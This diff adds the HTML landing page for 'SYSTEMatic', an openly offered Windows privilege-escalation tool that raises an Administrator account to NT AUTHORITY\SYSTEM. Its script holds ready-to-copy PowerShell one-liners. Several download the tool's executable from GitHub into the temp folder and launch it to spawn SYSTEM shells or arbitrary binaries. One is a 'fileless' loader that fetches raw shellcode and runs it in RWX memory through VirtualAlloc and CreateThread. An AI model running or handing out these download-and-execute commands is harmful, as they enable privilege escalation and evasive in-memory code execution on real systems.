@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SYSTEMatic</title>
+<meta name="description" content="Windows privilege escalation from Administrator to NT AUTHORITY\SYSTEM via token impersonation. Pure Win32 API, no external tools.">
+<meta property="og:title" content="SYSTEMatic">
+<meta property="og:description" content="Windows privilege escalation from Administrator to NT AUTHORITY\SYSTEM via token impersonation. Pure Win32 API, no external tools.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://franckferman.github.io/SYSTEMatic/">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg:      #060606;
+  --s1:      #0d0d0d;
+  --s2:      #111;
+  --border:  #1c1c1c;
+  --dim:     #252525;
+  --text:    #cccccc;
+  --muted:   #444;
+  --faint:   #1e1e1e;
+  --accent:  #c0392b;
+  --accent2: #e74c3c;
+  --blue:    #1a6fff;
+  --green:   #27ae60;
+  --mono:    'Courier New', Courier, monospace;
+}
+
+html, body { height: 100%; background: var(--bg); color: var(--text); font-family: var(--mono); overflow-x: hidden; }
+
+/* SCANLINES */
+body::before {
+  content: ''; position: fixed; inset: 0;
+  background: repeating-linear-gradient(to bottom,
+    transparent 0px, transparent 3px,
+    rgba(0,0,0,0.07) 3px, rgba(0,0,0,0.07) 4px);
+  pointer-events: none; z-index: 1000;
+}
+
+/* BG GLOW */
+.bg-glow {
+  position: fixed; inset: 0;
+  background: radial-gradient(ellipse 80% 60% at 50% 55%,
+    rgba(192,57,43,.05) 0%, transparent 70%);
+  animation: glow-breathe 5s ease-in-out infinite;
+  pointer-events: none; z-index: 0;
+}
+@keyframes glow-breathe { 0%,100%{opacity:.6} 50%{opacity:1} }
+
+/* GRID */
+.bg-grid {
+  position: fixed; inset: 0;
+  background-image:
+    linear-gradient(rgba(255,255,255,.012) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,.012) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none; z-index: 0;
+}
+
+/* LAYOUT */
+.page {
+  position: relative; z-index: 1;
+  min-height: 100vh;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  padding: 2.5rem 1.5rem 3.5rem; gap: 2.8rem;
+}
+
+/* HEADER */
+.header { text-align: center; display: flex; flex-direction: column; align-items: center; gap: .9rem; }
+
+.req-pill {
+  display: inline-flex; align-items: center; gap: .5rem;
+  font-size: .6rem; letter-spacing: .18em; text-transform: uppercase;
+  color: var(--muted); border: 1px solid var(--faint);
+  padding: .22rem .75rem; border-radius: 2px;
+}
+.req-pill::before {
+  content: ''; width: 5px; height: 5px; border-radius: 50%;
+  background: var(--accent); animation: blink 2.4s infinite;
+}
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.25} }
+
+/* GLITCH */
+.glitch {
+  font-size: clamp(2.8rem, 9vw, 5.8rem);
+  font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
+  color: var(--text); position: relative; user-select: none;
+}
+.glitch::before, .glitch::after {
+  content: attr(data-text);
+  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+}
+.glitch::before {
+  color: var(--accent2);
+  clip-path: inset(100% 0 0 0);
+  animation: gb 5s infinite;
+}
+.glitch::after {
+  color: rgba(195,195,195,.85);
+  clip-path: inset(100% 0 0 0);
+  animation: ga 5s infinite;
+}
+@keyframes gb {
+  0%,81%,87%,93%,100% { clip-path:inset(100% 0 0 0); transform:translate(0); opacity:1; }
+  82%   { clip-path:polygon(0 11%,100% 11%,100% 20%,0 20%); transform:translate(-11px,0); }
+  83%   { clip-path:polygon(0 44%,100% 44%,100% 53%,0 53%,0 7%,100% 7%,100% 15%,0 15%); transform:translate(7px,0); }
+  84%   { clip-path:polygon(0 67%,100% 67%,100% 75%,0 75%); transform:translate(-5px,0); }
+  85%   { clip-path:polygon(0 29%,100% 29%,100% 37%,0 37%); transform:translate(9px,0); }
+  86%   { clip-path:inset(100% 0 0 0); transform:translate(0); }
+  91%   { clip-path:polygon(0 19%,100% 19%,100% 27%,0 27%); transform:translate(-6px,0); opacity:.4; }
+  92%   { clip-path:inset(100% 0 0 0); opacity:0; }
+}
+@keyframes ga {
+  0%,81%,87%,93%,100% { clip-path:inset(100% 0 0 0); transform:translate(0); opacity:1; }
+  82.4% { clip-path:polygon(0 57%,100% 57%,100% 66%,0 66%); transform:translate(10px,0); }
+  83.4% { clip-path:polygon(0 24%,100% 24%,100% 32%,0 32%,0 71%,100% 71%,100% 79%,0 79%); transform:translate(-7px,0); }
+  84.4% { clip-path:polygon(0 49%,100% 49%,100% 58%,0 58%); transform:translate(5px,0); }
+  85.4% { clip-path:polygon(0 14%,100% 14%,100% 21%,0 21%); transform:translate(-8px,0); }
+  86.4% { clip-path:inset(100% 0 0 0); transform:translate(0); }
+  91.5% { clip-path:polygon(0 59%,100% 59%,100% 67%,0 67%); transform:translate(5px,0); opacity:.3; }
+  92.5% { clip-path:inset(100% 0 0 0); opacity:0; }
+}
+
+.tagline {
+  font-size: clamp(.7rem, 1.8vw, .85rem);
+  letter-spacing: .2em; text-transform: uppercase;
+  color: var(--muted); text-align: center;
+}
+.tagline .arrow { color: var(--accent2); }
+
+/* SCENARIO BLOCK */
+.scenario-block { width: 100%; max-width: 760px; display: flex; flex-direction: column; gap: 0; }
+
+/* TABS */
+.tabs {
+  display: flex; gap: 0;
+  border-bottom: 1px solid var(--border);
+  overflow-x: auto;
+}
+.tab {
+  background: none; border: none; cursor: pointer;
+  font-family: var(--mono); font-size: .68rem;
+  letter-spacing: .12em; text-transform: uppercase;
+  color: var(--muted);
+  padding: .65rem 1.1rem;
+  border-bottom: 2px solid transparent;
+  margin-bottom: -1px;
+  transition: color .15s, border-color .15s;
+  white-space: nowrap;
+  display: flex; align-items: center; gap: .45rem;
+}
+.tab:hover { color: var(--text); }
+.tab.active { color: var(--text); border-bottom-color: var(--accent); }
+.kbd {
+  display: inline-block; font-size: .55rem; color: var(--faint);
+  border: 1px solid var(--faint); padding: .05rem .28rem; border-radius: 2px;
+  transition: color .15s, border-color .15s;
+}
+.tab:hover .kbd, .tab.active .kbd { color: var(--muted); border-color: var(--dim); }
+
+/* TERMINAL */
+.terminal {
+  background: var(--s1);
+  border: 1px solid var(--border); border-top: none;
+  border-radius: 0 0 5px 5px; overflow: hidden;
+  transition: box-shadow .3s;
+}
+.terminal:hover { box-shadow: 0 0 50px rgba(192,57,43,.08), 0 8px 40px rgba(0,0,0,.4); }
+
+.term-bar {
+  background: var(--s2); padding: .55rem 1rem;
+  display: flex; align-items: center; gap: .45rem;
+  border-bottom: 1px solid var(--border);
+}
+.dot { width: 9px; height: 9px; border-radius: 50%; transition: background .25s; }
+.dot-r { background: #3d1a1a; }
+.dot-y { background: #2e2a14; }
+.dot-g { background: #152a1a; }
+.terminal:hover .dot-r { background: #c0392b; }
+.terminal:hover .dot-y { background: #c0892b; }
+.terminal:hover .dot-g { background: #27ae60; }
+.term-label { font-size: .62rem; color: var(--muted); margin: 0 auto; padding-right: 28px; letter-spacing: .05em; }
+
+.term-body {
+  padding: 1.1rem 1.4rem;
+  display: flex; align-items: flex-start; gap: .8rem;
+  min-height: 3.4rem; overflow-x: auto;
+}
+.ps { color: var(--accent2); font-size: .95rem; flex-shrink: 0; margin-top: .05rem; user-select: none; }
+
+#cmd-display {
+  font-size: clamp(.72rem, 1.7vw, .84rem); line-height: 1.55; flex: 1;
+  white-space: nowrap;
+  animation: cmd-in .18s ease;
+}
+@keyframes cmd-in { from{opacity:0;transform:translateY(3px)} to{opacity:1;transform:none} }
+
+.kw   { color: #569cd6; }
+.str  { color: #ce9178; }
+.url  { color: #4ec9b0; }
+.sep  { color: var(--muted); }
+.flag { color: #dcdcaa; }
+
+/* DESC */
+.tab-desc {
+  font-size: .64rem; letter-spacing: .08em;
+  color: var(--muted); margin-top: .7rem; min-height: 1rem;
+  animation: cmd-in .18s ease;
+}
+.tab-desc .hl { color: var(--text); }
+
+/* ACTIONS */
+.actions { display: flex; gap: .8rem; margin-top: 1.2rem; align-items: center; flex-wrap: wrap; }
+
+.copy-btn {
+  background: var(--accent); color: #fff; border: none;
+  padding: .8rem 2rem; font-family: var(--mono); font-size: .72rem;
+  letter-spacing: .15em; text-transform: uppercase;
+  cursor: pointer; border-radius: 3px;
+  transition: background .15s, box-shadow .2s, transform .1s;
+}
+.copy-btn:hover { background: var(--accent2); box-shadow: 0 0 24px rgba(231,76,60,.28); }
+.copy-btn:active { transform: scale(.97); }
+.copy-btn.ok { background: #1b6e3a; box-shadow: 0 0 24px rgba(39,174,96,.2); }
+
+.kbd-hint { font-size: .6rem; letter-spacing: .1em; color: var(--muted); }
+.kbd-hint kbd {
+  font-family: var(--mono); border: 1px solid var(--dim);
+  padding: .1rem .3rem; border-radius: 2px; font-size: .58rem; color: var(--muted);
+  cursor: pointer; transition: color .15s, border-color .15s;
+}
+.kbd-hint kbd:hover { color: var(--text); border-color: var(--border); }
+
+/* SECONDARY LINKS */
+.links { display: flex; gap: 1.2rem; flex-wrap: wrap; justify-content: center; }
+.lnk {
+  font-family: var(--mono); font-size: .66rem;
+  letter-spacing: .12em; text-transform: uppercase;
+  color: var(--muted); text-decoration: none;
+  border: 1px solid var(--faint); padding: .5rem 1.1rem; border-radius: 3px;
+  transition: color .15s, border-color .15s;
+}
+.lnk:hover { color: var(--text); border-color: var(--border); }
+
+/* FOOTER */
+footer {
+  position: fixed; bottom: 1rem; left: 0; right: 0;
+  text-align: center; font-size: .6rem;
+  letter-spacing: .1em; color: #1e1e1e;
+  pointer-events: none; z-index: 1;
+}
+footer a { color: #2a2a2a; text-decoration: none; pointer-events: all; transition: color .15s; }
+footer a:hover { color: var(--muted); }
+
+/* Tablet */
+@media (max-width: 700px) {
+  .page { gap: 2.2rem; }
+  .term-label { display: none; }
+}
+
+/* Mobile */
+@media (max-width: 560px) {
+  .page { gap: 1.8rem; padding: 2rem 1rem 3.5rem; }
+  .tab { padding: .6rem .7rem; font-size: .61rem; letter-spacing: .08em; }
+  .term-body { padding: .9rem 1rem; }
+  .actions { flex-direction: column; align-items: stretch; }
+  .copy-btn { width: 100%; padding: .9rem 1rem; }
+  .kbd-hint { display: none; }
+}
+
+/* Small phones */
+@media (max-width: 380px) {
+  .page { padding: 1.5rem .75rem 3.5rem; gap: 1.5rem; }
+  .glitch { letter-spacing: .03em; }
+  .req-pill { font-size: .55rem; letter-spacing: .1em; }
+  .tab { padding: .55rem .6rem; font-size: .58rem; letter-spacing: .05em; }
+  .links { gap: .7rem; }
+  .lnk { padding: .45rem .85rem; font-size: .62rem; }
+}
+</style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="bg-glow"></div>
+
+<div class="page">
+
+  <div class="header">
+    <span class="req-pill">Requires Administrator</span>
+    <h1 class="glitch" data-text="SYSTEMatic">SYSTEMatic</h1>
+    <p class="tagline">Administrator &nbsp;<span class="arrow">&#x2192;</span>&nbsp; NT AUTHORITY\SYSTEM</p>
+  </div>
+
+  <div class="scenario-block">
+    <div class="tabs" role="tablist">
+      <button class="tab active" onclick="setTab(0)"><span class="kbd">1</span> default</button>
+      <button class="tab"        onclick="setTab(1)"><span class="kbd">2</span> powershell</button>
+      <button class="tab"        onclick="setTab(2)"><span class="kbd">3</span> --logon-profile</button>
+      <button class="tab"        onclick="setTab(3)"><span class="kbd">4</span> custom</button>
+      <button class="tab"        onclick="setTab(4)"><span class="kbd">5</span> fileless</button>
+    </div>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <span class="dot dot-r"></span>
+        <span class="dot dot-y"></span>
+        <span class="dot dot-g"></span>
+        <span class="term-label">Windows PowerShell &mdash; Administrator</span>
+      </div>
+      <div class="term-body">
+        <span class="ps">PS&gt;</span>
+        <span id="cmd-display"></span>
+      </div>
+    </div>
+
+    <div id="tab-desc" class="tab-desc"></div>
+
+    <div class="actions">
+      <button class="copy-btn" id="copy-btn" onclick="copyCmd()">Copy</button>
+      <span class="kbd-hint">switch &nbsp;<kbd onclick="setTab(0)">1</kbd><kbd onclick="setTab(1)">2</kbd><kbd onclick="setTab(2)">3</kbd><kbd onclick="setTab(3)">4</kbd><kbd onclick="setTab(4)">5</kbd></span>
+    </div>
+  </div>
+
+  <div class="links">
+    <a class="lnk" href="https://github.com/franckferman/SYSTEMatic/releases/latest/download/SYSTEMatic.exe" target="_blank" rel="noopener">Download .exe</a>
+    <a class="lnk" href="https://github.com/franckferman/SYSTEMatic" target="_blank" rel="noopener">Source</a>
+    <a class="lnk" href="https://github.com/franckferman/SYSTEMatic#readme" target="_blank" rel="noopener">Docs</a>
+  </div>
+
+</div>
+
+<footer>
+  <a href="https://github.com/franckferman">Franck FERMAN</a> &nbsp;&middot;&nbsp; AGPL-3.0
+</footer>
+
+<script>
+const BASE     = 'https://github.com/franckferman/SYSTEMatic/releases/latest/download/SYSTEMatic.exe';
+const BASE_BIN = 'https://github.com/franckferman/SYSTEMatic/releases/latest/download/SYSTEMatic.bin';
+const TMP      = '"$env:TEMP\\s.exe"';
+
+const S = [
+  {
+    raw:  `iwr ${BASE} -Out ${TMP}; Start-Process ${TMP}`,
+    html: `<span class="kw">iwr</span> <span class="url">${BASE}</span> <span class="kw">-Out</span> <span class="str">${TMP}</span><span class="sep">;</span> <span class="kw">Start-Process</span> <span class="str">${TMP}</span>`,
+    desc: `Spawn <span class="hl">cmd.exe</span> as SYSTEM &mdash; default, no flags required.`,
+  },
+  {
+    raw:  `iwr ${BASE} -Out ${TMP}; Start-Process ${TMP} -ArgumentList "powershell.exe"`,
+    html: `<span class="kw">iwr</span> <span class="url">${BASE}</span> <span class="kw">-Out</span> <span class="str">${TMP}</span><span class="sep">;</span> <span class="kw">Start-Process</span> <span class="str">${TMP}</span> <span class="flag">-ArgumentList</span> <span class="str">"powershell.exe"</span>`,
+    desc: `Spawn <span class="hl">powershell.exe</span> as SYSTEM.`,
+  },
+  {
+    raw:  `iwr ${BASE} -Out ${TMP}; Start-Process ${TMP} -ArgumentList "--logon-profile"`,
+    html: `<span class="kw">iwr</span> <span class="url">${BASE}</span> <span class="kw">-Out</span> <span class="str">${TMP}</span><span class="sep">;</span> <span class="kw">Start-Process</span> <span class="str">${TMP}</span> <span class="flag">-ArgumentList</span> <span class="str">"--logon-profile"</span>`,
+    desc: `Full SYSTEM environment &mdash; loads <span class="hl">HKCU</span>, <span class="hl">%USERPROFILE%</span>, machine account network auth.`,
+  },
+  {
+    raw:  `iwr ${BASE} -Out ${TMP}; Start-Process ${TMP} -ArgumentList '"C:\\path\\to\\binary.exe"'`,
+    html: `<span class="kw">iwr</span> <span class="url">${BASE}</span> <span class="kw">-Out</span> <span class="str">${TMP}</span><span class="sep">;</span> <span class="kw">Start-Process</span> <span class="str">${TMP}</span> <span class="flag">-ArgumentList</span> <span class="str">'"C:\\path\\to\\binary.exe"'</span>`,
+    desc: `Spawn any binary as SYSTEM &mdash; replace <span class="hl">C:\\path\\to\\binary.exe</span>.`,
+  },
+  {
+    raw:  `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$b=(iwr '${BASE_BIN}' -UseBasicParsing).RawContentStream.ToArray();Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr i);}';$m=[W]::VirtualAlloc(0,$b.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);[W]::CreateThread(0,0,$m,0,0,0)|Out-Null`,
+    html: `<span class="kw">$b</span><span class="sep">=(</span><span class="kw">iwr</span> <span class="url">'${BASE_BIN}'</span> <span class="flag">-UseBasicParsing</span><span class="sep">).</span><span class="kw">Content</span><span class="sep">;</span> <span class="kw">Add-Type</span> <span class="flag">-TypeDefinition</span> <span class="str">'[DllImport] VirtualAlloc + CreateThread'</span><span class="sep">;</span> <span class="kw">$m</span><span class="sep">=[</span><span class="kw">W</span><span class="sep">]::</span><span class="kw">VirtualAlloc</span><span class="sep">(0,</span><span class="kw">$b</span><span class="sep">.</span><span class="kw">Length</span><span class="sep">,0x3000,0x40);</span> <span class="sep">[</span><span class="kw">Marshal</span><span class="sep">]::</span><span class="kw">Copy</span><span class="sep">(</span><span class="kw">$b</span><span class="sep">,0,</span><span class="kw">$m</span><span class="sep">,</span><span class="kw">$b</span><span class="sep">.</span><span class="kw">Length</span><span class="sep">);</span> <span class="sep">[</span><span class="kw">W</span><span class="sep">]::</span><span class="kw">CreateThread</span><span class="sep">(0,0,</span><span class="kw">$m</span><span class="sep">,0,0,0)|</span><span class="kw">Out-Null</span>`,
+    desc: `Fileless &mdash; shellcode loaded into <span class="hl">RWX memory</span> via <span class="hl">VirtualAlloc</span>, executed with <span class="hl">CreateThread</span>. Zero disk write.`,
+  },
+];
+
+let cur = 0;
+
+function setTab(i) {
+  cur = i;
+  document.querySelectorAll('.tab').forEach((t, idx) => t.classList.toggle('active', idx === i));
+  const d = document.getElementById('cmd-display');
+  d.innerHTML = '';
+  void d.offsetWidth;
+  d.innerHTML = S[i].html;
+  document.getElementById('tab-desc').innerHTML = S[i].desc;
+}
+
+function copyCmd() {
+  const btn = document.getElementById('copy-btn');
+  navigator.clipboard.writeText(S[cur].raw).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('ok');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1800);
+  });
+}
+
+document.addEventListener('keydown', e => {
+  const n = parseInt(e.key);
+  if (n >= 1 && n <= S.length && !e.ctrlKey && !e.metaKey && !e.altKey) setTab(n - 1);
+});
+
+setTab(0);
+</script>
+</body>
+</html>
